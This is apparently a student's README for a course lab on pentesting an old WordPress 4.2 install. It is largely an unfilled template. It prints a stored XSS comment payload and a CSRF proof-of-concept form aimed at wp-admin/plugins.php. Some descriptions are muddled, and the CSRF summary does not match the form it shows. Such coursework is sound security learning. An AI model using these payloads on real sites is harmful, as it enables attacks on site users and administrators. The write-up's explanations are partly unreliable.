# Project 7 - WordPress Pentesting

Time spent: **X** hours spent in total

> Objective: Find, analyze, recreate, and document **five vulnerabilities** affecting an old version of WordPress

## Pentesting Report

1. Unauthenticated Stored Cross-Site Scripting
  - [ ] Summary: This is a XSS attack which stores a script in the comment section of a post. When an unaware user navigates to the link, they are constantly bombabred with the hello world pop-up
    - Vulnerability types: XSS
    - Tested in version: 4.2
    - Fixed in version: 4.2.1
  - [ ] GIF Walkthrough: https://gph.is/2Gf2eF0
  - [ ] Steps to recreate: I copied the code from the Kali Linux and added a bunch As to the end of the script to overload the comment. I then pasted the script onto the comment section and the code is executed
  - [ ] Affected source code:<a title='x onmouseover=alert(unescape(/hello%20world/.source)) style=position:absolute;left:0;top:0;width:5000px;height:5000px  AAAAAAAAAAAA...[64 kb]..AAA'></a>
    - [Link 1](https://core.trac.wordpress.org/browser/tags/version/src/source_file.php)
    
2. Filesystem Credentials Dialog CSRF
  - [ ] Summary: This attack manipulates the login page and uses a fake login button to lure the user into logging into a malicious website set up by the attacker, stealing their usernames and passwords. 
    - Vulnerability types: CSRF
    - Tested in version:4.2
    - Fixed in version: 4.2.15
  - [ ] GIF Walkthrough: https://gph.is/2L2LCE3
  - [ ] Steps to recreate: I first deleted the original login button on wordpress. Then I used html code given on the website and pasted that onto the login form so that it looks like a regular login button. Information that are being inputted into that website are then captured by burp and the attacker can use those captured credentials to login.
  - [ ] Affected source code: 
  <html>
   <body>
      <form action="http://<target>/wp-admin/plugins.php" method="POST">
         <input type="hidden" name="hostname" value="sumofpwn.nl" />
         <input type="hidden" name="connection_type" value="ftp" />
         <input type="hidden" name="password" value="password" />
         <input type="submit" value="Submit request" />
      </form>
   </body>
</html>
    - https://sumofpwn.nl/advisory/2016/cross_site_request_forgery_in_wordpress_connection_information.html
    
1. (Required) Vulnerability Name or ID
  - [ ] Summary: 
    - Vulnerability types: 
    - Tested in version: 
    - Fixed in version: 
  - [ ] GIF Walkthrough: 
  - [ ] Steps to recreate: 
  - [ ] Affected source code:
    - [Link 1]
1. (Optional) Vulnerability Name or ID
  - [ ] Summary: 
    - Vulnerability types:
    - Tested in version:
    - Fixed in version: 
  - [ ] GIF Walkthrough: 
  - [ ] Steps to recreate: 
  - [ ] Affected source code:
    - [Link 1](https://core.trac.wordpress.org/browser/tags/version/src/source_file.php)
1. (Optional) Vulnerability Name or ID
  - [ ] Summary: 
    - Vulnerability types:
    - Tested in version:
    - Fixed in version: 
  - [ ] GIF Walkthrough: 
  - [ ] Steps to recreate: 
  - [ ] Affected source code:
    - [Link 1](https://core.trac.wordpress.org/browser/tags/version/src/source_file.php) 

## Assets

List any additional assets, such as scripts or files

## Resources

- [WordPress Source Browser](https://core.trac.wordpress.org/browser/)
- [WordPress Developer Reference](https://developer.wordpress.org/reference/)

GIFs created with [LiceCap](http://www.cockos.com/licecap/).

## Notes

Describe any challenges encountered while doing the work

## License

    Copyright [yyyy] [name of copyright owner]

    Licensed under the Apache License, Version 2.0 (the "License");
    you may not use this file except in compliance with the License.
    You may obtain a copy of the License at

        http://www.apache.org/licenses/LICENSE-2.0

    Unless required by applicable law or agreed to in writing, software
    distributed under the License is distributed on an "AS IS" BASIS,
    WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
    See the License for the specific language governing permissions and
    limitations under the License.
